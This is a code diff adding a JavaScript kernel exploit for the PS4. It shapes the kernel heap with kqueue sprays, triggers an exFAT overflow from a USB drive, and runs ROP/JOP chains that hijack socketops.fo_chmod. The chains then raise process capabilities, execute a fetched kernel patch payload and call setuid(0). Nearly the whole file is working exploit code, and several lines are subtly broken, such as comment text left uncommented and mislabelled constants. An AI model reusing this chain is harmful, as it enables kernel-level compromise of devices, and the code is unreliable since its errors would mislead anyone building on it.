@@ -666,5 +666,540 @@ function test_rop(Chain) {
     }
 }
 
-debug_log('Chain903');
-test_rop(Chain);
+//debug_log('Chain903');
+//test_rop(Chain);
+
+function mlock_gadgets(gadgets) {
+    const chain = new Chain();
+
+    for (const [gadget, addr] of gadgets) {
+        // change this if you use longer gadgets
+        const max_gadget_length = 0x50;
+        chain.push_syscall('mlock', addr, max_gadget_length);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+}
+
+function mlock_kchain(kchain) {
+    const chain = new Chain();
+    const stack_buffer = kchain.stack_buffer;
+    const stack_buffer_p = get_view_vector(new Uint8Array(stack_buffer));
+    // have a view point to the buffer of stack_buffer
+    chain.syscall('mlock', stack_buffer_p, stack_buffer.byteLength);
+    chain.syscall('mlock', kchain.retval_addr, kchain._return_value.length);
+    chain.syscall('mlock', kchain.jmp_buf_p, kchain.jmp_buf.length);
+}
+
+function prepare_knote(kchain) {
+    const chain = new Chain();
+    const size = 0x4000 * 5;
+    // PROT_READ | PROT_WRITE
+    const prot_rw = 4;
+    const MAP_ANON = 0x1000;
+    const MAP_FIXED = 0x10;
+
+    chain.syscall(
+        'mmap',
+        0x5000,
+        size,
+        prot_rw,
+        MAP_ANON | MAP_FIXED,
+        0xffffffff,
+        0,
+    );
+    const knote = new Addr(chain.return_value);
+
+    debug_log(`knote addr: ${knote}`);
+    if (knote.low() !== 0x4000 && knote.high() !== 0) {
+        die('mmap() failed');
+    }
+
+    const filterops = knote.add(0x4000);
+    const jop_buffer = knote.add(0x8000);
+    const rax_ptrs = knote.add(0xc0ff);
+
+    const offset_kn_fop = 0x68;
+    knote.write64(0, jop_buffer);
+    knote.write64(offset_kn_fop, filterops);
+
+    const offset_f_detach = 0x30;
+    filterops.write64(offset_f_detach, kchain.get_gadget(kjop1));
+
+    jop_buffer.write64(0, rax_ptrs);
+
+    // for the kernel JOP chain
+    rax_ptrs.write64(0xe0, kchain.get_gadget(jop2));
+    rax_ptrs.write64(0x30, kchain.get_gadget(jop3));
+    rax_ptrs.write64(0x30, kchain.get_gadget(jop4));
+    // We need to cli before the pivot (to a user mode rsp) and to sti after
+    // the back pivot (the system needs to handle interrupts after all).
+    //
+    // Since ps4 5.00, a pseudo-SMAP mitigation has been employed. The thread
+    // scheduler checks if the stack pointer of a kernel thread is pointing to
+    // kernel memory, if not, crash the system.
+    rax_ptrs.write64(0, kchain.get_gadget('cli; jmp qword ptr [rax + 0x43]'));
+    rax_ptrs.write64(0x43, kchain.get_gadget(jop5));
+    // value to pivot rsp to
+    rax_ptrs.write64(0x18, kchain.stack_addr);
+
+    // * there are 2 calls to f_detach() in kqueue_close()
+    // * offset relative to the return address of the first f_detach()
+    // * epi = address of the epilogue of kqueue_close()
+    // kqueue_close() epilogue
+    const offset_kqueue_close_epi = 789;
+    // offset relative to epi
+    const offset_socketops = 0x179f39f;
+
+    // get kernel stack pointer
+    kchain.push_gadget('xchg rbp, rax; ret');
+    // ret_addr = *(rbp + 8)
+    kchain.push_gadget('add rax, 8; ret');
+    kchain.push_get_retval();
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+    // ret_addr += offset_kqueue_close_epi
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_kqueue_close_epi);
+    kchain.push_gadget('add rax, rdx; ret');
+    // modify return address to jump to the epilogue
+    // *(rbp + 8) = ret_addr
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+    // save rax as it will get clobbered and we still need it
+    // currently, rax = epi
+    kchain.push_get_retval();
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    // restore rbp
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_constant(-8);
+    kchain.push_gadget('add rax, rdx; ret');
+    kchain.push_gadget('xchg rbp, rax; ret');
+
+    // restore rax
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+
+    // socketops.fo_chmod = k2jop1
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_socketops + 0x40);
+    kchain.push_gadget('add rax, rdx; ret');
+    // also saves a kernel address &socketops.fo_chmod
+    kchain.push_get_retval();
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.retval_addr);
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(kchain.get_gadget(k2jop1));
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    // We'll check address 0x4000 later as an additional test to see if the
+    // kchain ran.
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_constant(0x4000);
+    kchain.push_gadget('pop rsi; ret');
+    kchain.push_constant("0xdeadbeefbeefdead");
+    kchain.push_gadget('mov qword ptr [rdi], rsi; ret');
+
+    // kernel ROP epilogue
+    //
+    // leave
+    // jmp gadgets['sti; ret']
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.get_gadget('sti; ret'));
+    kchain.push_gadget('leave; jmp rcx');
+
+    chain.syscall('mlock', knote, size);
+
+    // the mmaped area will be reused for the fchmod() kernel ROP chain
+    return [knote, size, jop_buffer, rax_ptrs];
+}
+
+// malloc/free until the heap is shaped in a certain way, such that the exFAT
+// heap oveflow bug overwrites a knote
+function trigger_oob(kchain) {
+    const chain = new Chain();
+
+    const num_kqueue = 0x5b0;
+    const kqueues = new Uint32Array(num_kqueue);
+    const kqueues_p = get_view_vector(kqueues);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        chain.push_syscall('kqueue');
+        chain.push_gadget('pop rdi; ret');
+        chain.push_value(kqueues_p.add(i * 4));
+        chain.push_gadget('mov dword ptr [rdi], eax; ret');
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    const AF_INET = 2;
+    const SOCK_STREAM = 1;
+    // socket file descriptor
+    chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
+    const sd = chain.return_value;
+    // We suspect why they want a specific file descriptor is because
+    // kqueue_expand() allocates memory whose size depends on the file
+    // descriptor number.
+    //
+    // The specific malloc size is probably a part in their method in shaping
+    // the heap.
+    //
+    // socket() returns an int (32-bit signed integer)
+    // if sd.high() !== 0, socket() returned an error
+    if (sd.low() < 0x200 || sd.low() >= 0x2000 || sd.high() !== 0) {
+        die(`invalid socket: ${sd}`);
+    }
+    debug_log(`socket descriptor: ${sd}`);
+
+    // spray kevents
+    const kevent = new Uint8Array(0x20);
+    const kevent_p = get_view_vector(kevent);
+    kevent_p.write64(1, sd);
+    // EV_ADD and EVFILT_READ
+    kevent_p.write32(0x8, 0x00fff);
+    kevent_p.write32(0xc, 1);
+    kevent_p.write64(0x10, Int.Zero);
+    kevent_p.write64(0x18, Int.Zero);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        // nchanges == 1, everything else is NULL/0
+        chain.push_syscall('kevent', kqueues[i], kevent_p, 0, 0, 0, 0);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // fragment memory
+    for (let i = 1800; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // trigger OOB
+    alert('insert USB');
+
+    // trigger corrupt knote
+    for (let i = 1; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    const kretval = kchain.return_value;
+    debug_log(`kchain retval: ${kretval}`);
+    debug_log(kchain.jmp_buf);
+    debug_log(new Addr(0x4000).read64(0));
+    if (kretval.low() === 0 && kretval.high() === 0) {
+        die('heap overflow failed');
+    }
+    debug_log('kernel ROP chain ran successfully');
+    kchain.clean();
+
+    // reuse sd for the fchmod() kernel ROP chain
+    return [sd, kretval];
+}
+
+function get_ucred_addr(kchain, sd, mmap_area) {
+    const chain = new Chain();
+    const offset_jmp_buf_rcx = 0x50;
+    const offset_thread_td_proc = 9;
+    const offset_proc_p_ucred = 0x40;
+
+    // we enter fo_chmod with rcx containing the "struct thread td" argument
+    kchain.push_save();
+
+    rax = td
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(kchain.jmp_buf_p);
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_jmp_buf_rcx);
+    kchain.push_gadget('add rax, rdx; ret');
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+    // rax = td->td_proc
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_thread_td_proc);
+    kchain.push_gadget('add rax, rdx; ret');
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+    // rax = td->td_proc->p_ucred
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(offset_proc_p_ucred);
+    kchain.push_gadget('add rax, rdx; ret');
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+
+    kchain.push_get_retval();
+
+    kchain.push_restore();
+
+    // socketops.fo_chmod() was previously invfo_chmod(), which just returned
+    // EINVAL
+    const EINVAL = 22;
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_constant(EINVAL);
+
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.get_gadget('sti; ret'));
+    kchain.push_gadget('leave; jmp rcx');
+
+    chain.syscall('fchmod', sd, mmap_area);
+    debug_log(`fchmod(): ${chain.return_value}`);
+    kchain.clean();
+
+    return kchain.return_value;
+}
+
+function get_jit_capabilities(kchain, sd, mmap_area, ucred_addr) {
+    const chain = new Chain();
+    // struct ucred has been customized for the ps4
+    // See
+    // OpenOrbis/mira-project/external/freebsd-headers/include/sys/ucred.h
+    // at https://github.com for the definition.
+    //
+    // credits to CelesteBlue for telling which cr_sceCaps[x] to modify
+    const p_ucred = ucred_addr;
+
+    // cr_sceCaps[0]
+    kchain.push_write64(p_ucred.add(0x60), new Int(-1));
+    // cr_sceCaps[1]
+    kchain.push_write64(p_ucred.add(0x68), new Int(-1));
+
+    // socketops.fo_chmod() was previously invfo_chmod(), which just returned
+    // EINVAL
+    const EINVAL = 22;
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_constant(EINVAL);
+
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.get_gadget('sti; ret'));
+    kchain.push_gadget('leave; jmp rcx');
+
+    chain.syscall('fchmod', sd, mmap_area);
+    kchain.clean();
+}
+
+async function kexec_payload(kchain, sd, mmap_area) {
+    const chain = new Chain();
+    const map_size = 0x903000;
+    // PROT_READ | PROT_WRITE | PROT_EXEC
+    const prot_rwx = 7;
+    // PROT_READ | PROT_EXEC
+    const prot_rx = 5;
+    // PROT_READ | PROT_WRITE
+    const prot_rw = 3;
+    const map_shared = 2;
+
+    chain.syscall('jitshm_create', 0, map_size, prot_rwx);
+    const exec_handle = chain.return_value;
+
+    chain.syscall('jitshm_alias', exec_handle, prot_rw);
+    const write_handle = chain.return_value;
+
+    chain.syscall(
+        'mmap',
+        '0x900300000',
+        map_size,
+        prot_rx,
+        map_shared,
+        exec_handle,
+        0,
+    );
+    const exec_addr = new Addr(chain.return_value);
+
+    chain.syscall(
+        'mmap',
+        '0x910000000',
+        map_size,
+        prot_rw,
+        map_shared,
+        write_handle,
+        0,
+    );
+    const write_addr = new Addr(chain.return_value);
+
+    debug_log(`exec_addr: ${exec_addr}`);
+    debug_log(`write_addr: ${write_addr}`);
+    if (exec_addr.low() !== 0
+        && exec_addr.high() !== 0x9
+        && write_addr.high() !== 0x10000000
+        && write_addr.high() !== 0x9
+    ) {
+        die('mmap() for jit failed');
+    }
+
+    // mov eax, 0x1337; ret
+    const test_code = new Int('0xc300025337b8');
+
+    write_addr.write64(0, test_code);
+    alert('test jit exec');
+    chain.call(exec_addr);
+    alert('returned successfully');
+    let retval = chain.return_value;
+
+    debug_log(`jit retval: ${retval}`);
+    if (retval.low() !== 0x1337 && retval.high() !== 0) {
+        die('test jit exec failed');
+    }
+
+    const buf = await get_patches('./kpatch/80x.elf');
+    // start of loadable segments is at offset 0x2000
+    const patches = new Uint8Array(buf, 0x3000);
+
+    if (patches.length > map_size) {
+        die(`patch file too large (>${$map_size}): ${patches.length}`);
+    }
+
+    // copy the file to executable memory
+    mem.set_addr(write_addr);
+    mem.worker.set(patches);
+    /*
+    for (let i = 0; i < patches.length; i++) {
+        write_addr.write8(i, patches[i]);
+    }
+    */
+
+    // lower end of the mmap_area
+    const scratch = new Addr(0xf000);
+
+    // Modify the stack frame so that we jump to exec_addr with interrupts
+    // enabled and rsp is a kernel address.
+    kchain.push_save();
+
+    scratch[0] = rbp
+    kchain.push_gadget('xchg rbp, rax; ret');
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_value(scratch);
+    kchain.push_gadget('mov qword ptr [rdi], rax; ret');
+
+    scratch[8] = old_rbp
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_value(scratch.add(9));
+    kchain.push_gadget('mov qword ptr [rdi], rax; ret');
+
+    rax = rbp
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(scratch);
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+
+    rax -= 8
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(-8);
+    kchain.push_gadget('add rax, rdx; ret');
+
+    scratch[0x10] = rbp - 8
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_value(scratch.add(0x10));
+    kchain.push_gadget('mov qword ptr [rdi], rax; ret');
+
+    rdx = rbp - 8
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(scratch.add(0x10));
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+
+    rax = old_rbp
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(scratch.add(8));
+    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
+
+    // *(rbp - 8) = old_rbp
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    // rdx = rbp
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(scratch);
+    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');
+
+    // *rbp = exec_addr
+    kchain.push_gadget('pop rax; ret');
+    kchain.push_value(exec_addr);
+    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');
+
+    kchain.push_restore();
+
+    // rbp -= 8
+    kchain.push_gadget('xchg rbp, rax; ret');
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(-8);
+    kchain.push_gadget('add rax, rdx; ret');
+    kchain.push_gadget('xchg rbp, rax; ret');
+
+    const EINVAL = 22;
+    // kpatch(kbase, EINVAL, NULL)
+    kchain.push_gadget('pop rdi; ret');
+    kchain.push_value(kbase);
+    kchain.push_gadget('pop rsi; ret');
+    kchain.push_constant(EINVAL);
+    kchain.push_gadget('pop rdx; ret');
+    kchain.push_constant(0);
+
+    // kernel ROP epilogue
+    //
+    // leave
+    // jmp gadgets['sti; ret']
+    kchain.push_gadget('pop rcx; ret');
+    kchain.push_value(kchain.get_gadget('sti; ret'));
+    kchain.push_gadget('leave; jmp rcx');
+
+    chain.syscall('mlock', exec_addr, map_size);
+
+    alert('test jit kexec');
+    chain.syscall('fchmod', sd, mmap_area);
+    kchain.clean();
+
+    chain.syscall('setuid', 0);
+    retval = chain.return_value;
+    debug_log(`setuid(): ${retval}`);
+    if (retval.low() !== 0 && retval.high() !== 0) {
+        die('kpatch() failed');
+    }
+}
+
+async function get_patches(url) {
+    const response = await fetch(url);
+
+    if (!response.ok) {
+        throw Error(`Network response was not OK, status: ${response.status}`);
+    }
+
+    return await response.arrayBuffer();
+}
+
+async function kexploit() {
+    init(Chain);
+    const kchain = new Chain();
+
+    mlock_gadgets(gadgets);
+    mlock_kchain(kchain);
+    const [
+        mmap_area,
+        mmap_area_size,
+        jop_buffer,
+        rax_ptrs,
+    ] = prepare_knote(kchain);
+    const [sd, kretval] = trigger_oob(kchain);
+
+    // offset relative to kernel base
+    const offset_k_socketops_fo_chmod = 0x1a76060;
+    kbase = kretval.sub(offset_k_socketops_fo_chmod);
+    debug_log(`kbase: ${kbase}`);
+
+    // setup for fchmod() kernel ROP chain
+    mmap_area.write64(8, jop_buffer);
+    rax_ptrs.write64(0x70, kchain.get_gadget(jop2));
+
+    const p_ucred = get_ucred_addr(kchain, sd, mmap_area);
+    debug_log(`p_ucred: ${p_ucred}`);
+
+    get_jit_capabilities(kchain, sd, mmap_area, p_ucred);
+    await kexec_payload(kchain, sd, mmap_area);
+}
+
+kexploit();
+
